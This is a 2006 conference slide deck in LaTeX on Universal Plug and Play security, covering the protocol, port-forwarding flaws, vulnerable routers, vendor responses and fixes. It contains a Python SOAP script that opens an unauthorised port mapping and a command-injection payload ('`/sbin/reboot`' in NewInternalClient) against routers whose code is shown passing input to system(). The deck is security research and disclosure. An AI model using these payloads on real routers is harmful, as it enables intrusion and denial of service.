\documentclass[10pt]{beamer}

\usepackage{url}
\author{Armijn Hemel}
\title{Universal Plug and Play - Dead simple or simply deadly?}
\date{May 18, 2006}

\begin{document}

\setlength{\parskip}{4pt}

\frame{\titlepage}

\section[Universal Plug and Play overview]{}

\frame{

\frametitle{Universal Plug and Play - introduction}

Bring the desktop ``plug and play'' concept to the (local) network. 

Benefits:

\begin{itemize}
\item no configuration on the part of the user
\item no installation of software, drivers, etcetera
\end{itemize}

UPnP is not unique:

\begin{itemize}
\item JINI (Sun Microsystems)
\item IETF ZeroConf (Apple ``Bonjour'', KDE, GNOME)
\end{itemize}

}

\frame{

\frametitle{History of UPnP}

\begin{itemize}
\item early 1999 as reaction by Microsoft to Sun's JINI
\item early 2000: first products with UPnP (Windows ME, Intel's Open Source
UPnP SDK)
\item Windows ME and Windows XP have UPnP support built-in since their release
\end{itemize}

Success!! JINI is dead, UPnP is everywhere.

}

\frame{

\frametitle{UPnP standardization}

Various organizations are involved in UPnP:

\begin{itemize}
\item UPnP Forum: create and publish new UPnP standards.
\item UPnP Implementers Corporation: UPnP certification and logo licensing.
\end{itemize}

}

\section[Protocol workings]{Protocol workings}

\frame{

\frametitle{UPnP protocol stack}

\begin{enumerate}
\setcounter{enumi}{-1}
\item addressing
\item discovery
\item description
\item control
\item eventing
\item presentation
\end{enumerate}
}


\frame{

\frametitle{UPnP protocol - addressing}

Zeroth, optional, step. If no DHCP server is found use ``auto-addressing'':

\begin{enumerate}
\item randomly pick an IP address from \url{169.254/16} IP range
\item if IP address is taken, abandon IP address and goto 1
\item else keep IP address
\end{enumerate}

More auto-addressing:

\begin{itemize}
\item IETF ZeroConf
\item Fedora Core (has a default route for \url{169.254/16})
\end{itemize}

}

\begin{frame}[fragile]

\frametitle{UPnP protocol - discovery}

On boot-up send a search request to UDP port 1900 on \url{239.255.255.250}:

\begin{verbatim}
M-SEARCH * HTTP/1.1
HOST: 239.255.255.250:1900
MAN: ssdp:discover
MX: 10
ST: ssdp:all
\end{verbatim}

Other UPnP devices should reply via UDP unicast. Example response (Alcatel
Speedtouch 510, slightly edited):

\begin{verbatim}
HTTP/1.1 200 OK
CACHE-CONTROL:max-age=1800
EXT:
LOCATION:http://10.0.0.138:80/IGD.xml
SERVER:SpeedTouch 510 4.0.0.9.0 UPnP/1.0 (DG233B00011961)
ST:upnp:rootdevice
USN:uuid:UPnP-SpeedTouch510-1_00::upnp:rootdevice
\end{verbatim}
\end{frame}

\begin{frame}[fragile]

\frametitle{UPnP protocol - discovery (continued)}

Not all devices conform to the standard! Linksys WRT54G/GS remain silent when
other clients join the network.

Periodically: send notifications to \url{239.255.255.250} on port 1900 UDP
(Linksys WRT54G output, slightly edited):

\begin{verbatim}
NOTIFY * HTTP/1.1
HOST: 239.255.255.250:1900
CACHE-CONTROL: max-age=180
Location: http://192.168.1.1:5431/dyndev/uuid:0014-bf09
NT: upnp:rootdevice
NTS: ssdp:alive
SERVER:LINUX/2.4 UPnP/1.0 BRCM400/1.0
USN: uuid:0014-bf09::upnp:rootdevice
\end{verbatim}

\end{frame}

\frame{

\frametitle{UPnP protocol - description}

\texttt{LOCATION} points to XML file which describes:

\begin{itemize}
\item control URL
\item events URL
\item SCPD URL (description of which functions are available, in XML)
\end{itemize}

}

\begin{frame}[fragile]

\frametitle{UPnP protocol - control}

Devices can be controlled by sending SOAP requests to the ``control
URL'', from XML file of previous step. SOAP wraps function calls in XML,
sent using HTTP.

\begin{verbatim}
<s:Envelope
 xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
 s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
 <s:Body>
   <u:GetExternalIPAddress
     xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">
   </u:GetExternalIPAddress>
 </s:Body>
</s:Envelope>
\end{verbatim}

No authentication/authorization, being on the LAN is enough to do this!!

\end{frame}

\frame{

\frametitle{UPnP protocol - eventing and presentation}

Changes in ``state variables'' are sent over the network to subscribed
clients.

Clients can subscribe to events, if they provide one or more callback URLs.

Presentation is the human controllable interface: the webinterface of the
device.

}

\frame{

\frametitle{UPnP profiles}

UPnP defines profiles: a set of actions, state variables, etcetera, that
implement specific functionality.

Standardized profiles:

\begin{itemize}
\item Internet Gateway Device (IGD)
\item MediaServer and MediaRenderer
\item Printer Device and Print Basic Service
\item Scanner (External Activity, Feeder, Scan, Scanner)
\item HVAC
\item WLAN Access Point Device
\item and more
\end{itemize}

Most popular: Internet Gateway Device and (recently) MediaServer and
MediaRenderer.

}

\frame{

\frametitle{Internet Gateway Device profile}

\begin{itemize}
\item WAN connection or ADSL modem (ADSL modems and (wireless) routers)
\item firewall + Network Address Translation
\item DNS server, DHCP server
\end{itemize}

Subprofiles:

\begin{itemize}
\item WANConnectionDevice
 \begin{itemize}
  \item WANIPConnection
  \item WANPPPConnection
 \end{itemize}
\item LANHostConfigManagement
\item Layer3Forwarding
\item WANCableLinkConfig
\item WANCommonInterfaceConfig
\end{itemize}

}

\section[Hacking UPnP]{Hacking UPnP}

\frame{

\frametitle{Hacking the Internet Gateway Device}

The Internet Gateway Device (IGD) is an interesting target:

\begin{itemize}
\item It controls access to a LAN. Control the IGD and you control the
connection to the outside world.
\item Use built-in features from the IGD to get access to interesting machines
on the LAN.
\end{itemize}
}

\frame{

\frametitle{Port forwarding}

The Internet Gateway Device profile allows port forwarding (via
\texttt{WANIPConnection} or \texttt{WANPPPConnection} subprofiles). Common
uses:

\begin{enumerate}
\item ask IGD to add a firewall rule to forward a port on external
interface of IGD to some port on our machine
\item ask IGD to add a firewall rule to forward a port on external
interface of IGD to some port on multicast or broadcast address
\end{enumerate}

\begin{itemize}
\item MSN Messenger (``webcam'', file transfers)
\item remote assistance (Windows XP)
\item X-Box
\item many bittorrent clients
\end{itemize}

}

\frame{

\frametitle{\texttt{WANIPConnection} and \texttt{WANPPPConnection} subprofiles}

\texttt{WANIPConnection} and \texttt{WANPPPConnection} subprofiles control
portmapping actions:

\begin{itemize}
\item add a portmapping
\item delete a portmapping
\item query existing portmappings
\end{itemize}

}

\frame{

\frametitle{Port forwarding -- SOAP action}

\texttt{AddPortMapping} SOAP function takes a few arguments:

\begin{itemize}
\item \texttt{NewRemoteHost} - source of inbound packets, usually empty (i.e.
all hosts)
\item \texttt{NewExternalPort} - port on the external interface of the IGD
\item \texttt{NewProtocol} - protocol of the port mapping (TCP or UDP)
\item \texttt{NewInternalPort} - port on \texttt{NewInternalClient} packets should be sent to
\item \texttt{NewInternalClient} - device on the LAN packets should be sent to (or: multicast or broadcast address)
\item \texttt{NewEnabled} - boolean value indicating if the portmapping should be enabled
\item \texttt{NewPortMappingDescription} - human readable string describing the portmapping
\item \texttt{NewLeaseDuration} - value indicating how long the portmapping should be valid
\end{itemize}

}

\begin{frame}[fragile]

\frametitle{Example code}

\begin{verbatim}
#! /usr/bin/python

import os
from SOAPpy import *

endpoint = "http://10.0.0.138/upnp/control/wanpppcpppoa"
namespace = "urn:schemas-upnp-org:service:WANPPPConnection:1"
server = SOAPProxy(endpoint, namespace)
soapaction2 = "urn:schemas-upnp-org:service:WANPPPConnection
               :1#AddPortMapping"

server._sa(soapaction2).AddPortMapping(NewRemoteHost="",
           NewExternalPort=5667, NewProtocol="TCP",
           NewInternalPort=22, NewInternalClient="10.0.0.152",
           NewEnabled=1,
           NewPortMappingDescription="evil h4x0r",
           NewLeaseDuration=0)
\end{verbatim}

\end{frame}

\frame{

\frametitle{Port forwarding -- protocol unclarities}

UPnP specifications are unclear regarding \texttt{NewInternalClient}.

Page 12 of the specification of \texttt{WANIPConnection} says this about
\texttt{NewInternalClient}:

\begin{quote}
``This variable represents the IP address or DNS host name of an internal
client (on the residential LAN).''
\end{quote}

On page 13 it says:

\begin{quote}
``Each 8-tuple configures NAT to listen for packets on the external interface
of the WANConnectionDevice on behalf of a specific client and dynamically
forward connection requests to that client.''
\end{quote}

Question: should \texttt{NewInternalClient} always be the machine the SOAP
request originates from?

}

\frame{

\frametitle{Port forwarding -- implementation errors}

Question: Can \texttt{NewInternalClient} be set to another internal
machine?

Answer: In most devices \textit{it can}!

}

\frame{

\frametitle{Impact}

UPnP specifications are very vague on this point!

Open connections to other machines on the LAN:

\begin{itemize}
\item Windows file server
\item internal webserver
\item printer
\item \dots
\end{itemize}

}

\frame{

\frametitle{Port forwarding -- implementation errors}

Question: Can \texttt{NewInternalClient} be set to an \textit{external}
machine?

Answer: In some devices \textit{it can}!

}

\frame{

\frametitle{Port forwarding -- implementation errors}

Some implementations accept a host not on LAN as \texttt{NewInternalClient}.
Connections to \texttt{NewExternalPort} (IGD external interface) are forwarded
to \texttt{NewInternalClient} \textit{even if it does not reside on the LAN}.

\begin{itemize}
\item onion routing (many devices don't log by default!)
\item reroute traffic: stealing mail, website defacement without hacking,
phishing (depending on network setup)
\item \dots
\end{itemize}

}

\frame{

\frametitle{Vulnerable devices}

\begin{itemize}
\item possibly anything Linux based from Broadcom
  \begin{itemize}
  \item Linksys WRT54G/WRT54GS
  \item Asus WL-HDD 2.5 (no router, still vulnerable, attack results in DoS)
  \item maybe more (check OpenWrt website)
  \end{itemize}
\item ZyXEL P-335WT
\item all ``EdiLinux'' based routers (Edimax, Sweex, Hawking, Planet, Canyon,
Conceptronic, Jaht, \dots). See also
\url{http://www.linux-mips.org/wiki/Adm5120}
\url{http://www.linux-mips.org/wiki/Realtek_SOC} (search for routers).
\end{itemize}

Probably more, but many vendors did not want to cooperate.

US Robotics already fixed this in Broadcom sources for their devices
in March 2005 but fixes never made it back into the original sources.

More devices for testing welcome!

}

\frame{

\frametitle{Code problems}

Often seen problem: parameter checking.

Input from SOAP request is often passed to an external command or
\texttt{sysctl} command that just takes whatever value is passed into SOAP.

Inject and execute MIPS/ARM/\dots\ shellcode on the router?

}

\begin{frame}[fragile]

\frametitle{``EdiLinux'' hack}

EdiLinux uses code from \url{http://linux-igd.sourceforge.net/}
(slightly adapted for readability):

\begin{verbatim}
int pmlist_AddPortMapping (char *protocol, char *externalPort,
                           char *internalClient,
                           char *internalPort) {
    char command[500];
    sprintf(command, "%s -t nat -A %s -i %s -p %s -m mport
          --dport %s -j DNAT --to %s:%s", g_iptables,
          g_preroutingChainName, g_extInterfaceName, protocol,
          externalPort, internalClient, internalPort);
    system (command);
    if (g_forwardRules) {
      sprintf(command,"%s -I %s -p %s -d %s -m mport
         --dport %s -j ACCEPT", g_iptables,g_forwardChainName,
         protocol, internalClient, internalPort);
      system(command);
    }
    return 1;
}
\end{verbatim}
\end{frame}

\begin{frame}[fragile]

\frametitle{``EdiLinux'' hack -- continued}

There \textit{is} a check for length (heavily edited):

\begin{verbatim}
struct portMap* pmlist_NewNode(int enabled, int duration,
         char *remoteHost, char *externalPort,
         char *internalPort, char *protocol,
         char *internalClient, char *desc) {

   struct portMap* temp;
   temp = (struct portMap*) malloc(sizeof(struct portMap));
   temp->m_PortMappingEnabled = enabled;
   temp->m_PortMappingLeaseDuration = duration;

   if (strlen(remoteHost) < sizeof(temp->m_RemoteHost))
              strcpy(temp->m_RemoteHost, remoteHost);
       else strcpy(temp->m_RemoteHost, "");
   if (strlen(internalClient) < sizeof(temp->m_InternalClient))
              strcpy(temp->m_InternalClient, internalClient);
       else strcpy(temp->m_InternalClient, "");
   ...
\end{verbatim}

\end{frame}

\begin{frame}[fragile]

\frametitle{``EdiLinux'' hack -- continued}

\begin{verbatim}
struct portMap
{
   int m_PortMappingEnabled;
   long int m_PortMappingLeaseDuration;
   char m_RemoteHost[16];
   char m_ExternalPort[6];
   char m_InternalPort[6];
   char m_PortMappingProtocol[4];
   char m_InternalClient[16];
   char m_PortMappingDescription[50];

        struct portMap* next;
        struct portMap* prev;
} *pmlist_Head, *pmlist_Tail, *pmlist_Current;
\end{verbatim}

There is 15 bytes for exploit code!

\end{frame}

\begin{frame}[fragile]

\frametitle{``EdiLinux'' hack -- continued}

The following SOAP code remotely \textit{reboots} the router:

\begin{verbatim}
server._sa(soapaction2).AddPortMapping(NewRemoteHost="",
    NewExternalPort=21, NewProtocol="TCP", NewInternalPort=21,
    NewInternalClient="`/sbin/reboot`", NewEnabled=1,
    NewPortMappingDescription="blah", NewLeaseDuration=0)
\end{verbatim}

Remote root exploit for just 30 Euro!

UPnP is by default off on the Edimax BR-6104K.

\end{frame}

\frame{

\frametitle{Reactions from vendors}

Linksys:

\begin{itemize}
\item Fix has been released for WRT54GS, not (yet) for WRT54G.
\item Still investigating other devices.
\end{itemize}


Zyxel:

\begin{itemize}
\item No high priority, UPnP is turned off by default.
\item Firmware will be patched (eventually). New machines will not have this vulnerability.
\end{itemize}


Edimax:

\begin{itemize}
\item bug was discovered on May 12. Edimax was informed right away. No response.
\end{itemize}

Others:

\begin{itemize}
\item bugs were discovered between May 12 and 15 (by code analysis). Some
companies were informed (others: no contact address), few responses. Netgear
and Sitecom are fixing problems.
\end{itemize}

}

\frame{

\frametitle{Risks and impact}

So what??

Attacks are no remote attacks, but originate from LAN (extra obstacle).

\begin{itemize}
\item virus, spyware, P2P software, open access points
\item infected computer is relatively easy to detect, reconfigured
router is a lot harder to find.
\end{itemize}

UPnP should be turned off.

\begin{itemize}
    \item people want to use it
    \item people don't know how to turn it off, or can't turn it off
(Speedtouch 510 has no option in webinterface).
\end{itemize}

Install firmware upgrades!

\begin{itemize}
\item firmware upgrades are hardly ever installed
\end{itemize}

}

\frame{

\frametitle{Risks and impact - continued}

\begin{itemize}
\item millions of UPnP capable routers have been sold and are in use
\item users don't upgrade router firmware (do you??)
\item vendors often stop supporting devices after a certain period, if they
support devices at all! (Especially companies that just rebrand and sell
devices)
\end{itemize}

Result: many consumer grade ADSL/cable lines with vulnerable routers and a lot
of bandwidth to waste. Ouch!

}

\frame{

\frametitle{Fixing UPnP}

Two ways to fix UPnP:

\begin{enumerate}
\item completely redesign the protocol with security into mind
\item fix holes in current UPnP implementations
\end{enumerate}

}

\frame{

\frametitle{Redesign UPnP}

Security has been tried as add-on profiles \texttt{Device Security} and
\texttt{Security Console}. Never picked up by vendors.

Problem: security is orthogonal to ease of use. Security means configuring
devices properly: this is hard!

Security doesn't sell, ease of use does!

Combining security and ease of use without compromising any, or both?

Backward compatibility?

}

\frame{

\frametitle{Plumb IGD errors}

Various, relatively straightforward, fixes:

\begin{itemize}
\item blacklisting/whitelisting devices
\item always test if \texttt{NewInternalClient} is the requesting machine
\item verify/validate input!!!
\end{itemize}

Fixes will not (or hardly) affect users and use of programs and take away
some threats.

Problems:

\begin{itemize}
\item vendors need to be willing to fix (development costs)
\item users need to install fixes
\end{itemize}
}

\frame{

\frametitle{Hacking the UPnP A/V profile}

UPnP A/V profile is getting used more and more:

\begin{itemize}
\item Philips Streamium (some models)
\item X-Box 360 (limited use)
\item Noxon Audio
\item Netgear MP115
\item many more
\end{itemize}

Uncharted hacking territory!

}

\frame{

\frametitle{Hacking the UPnP A/V profile}

Two basic types of devices:

\begin{enumerate}
\item \texttt{MediaServer}
\item \texttt{MediaRenderer}
\end{enumerate}

\texttt{MediaServer} streams content, \texttt{MediaRenderer} plays content
(audio or video). Specifications say both types of devices can be controlled
by an \textit{external} control point.

}

\frame{

\frametitle{Hacking the UPnP A/V profile}

Possible hacks:

\begin{itemize}
\item ``steal'' content (DRM protected that was paid for?) from a
\texttt{MediaServer} by sending it off the LAN.
\item play content from outside the LAN on a \texttt{MediaRenderer} without
the user's consent (audio and video spamming).
\end{itemize}

I have not worked on these hacks yet:

\begin{itemize}
\item no time (yet)
\item no devices to test with, except for a Noxon Audio
\end{itemize}

Devices welcome!

}


\section[Conclusion]{Conclusion}

\frame{
\frametitle{Conclusions}

Universal Plug and Play:

\begin{itemize}
\item is not very well designed
\item has ambigious specifications leading to easy to exploit security holes
\item is everywhere
\item won't disappear
\end{itemize}

Just turn it off, hmkay?

}

\frame{

\frametitle{The end...}

\begin{enumerate}
\item Questions?
\item Tea!
\end{enumerate}
}

\end{document}
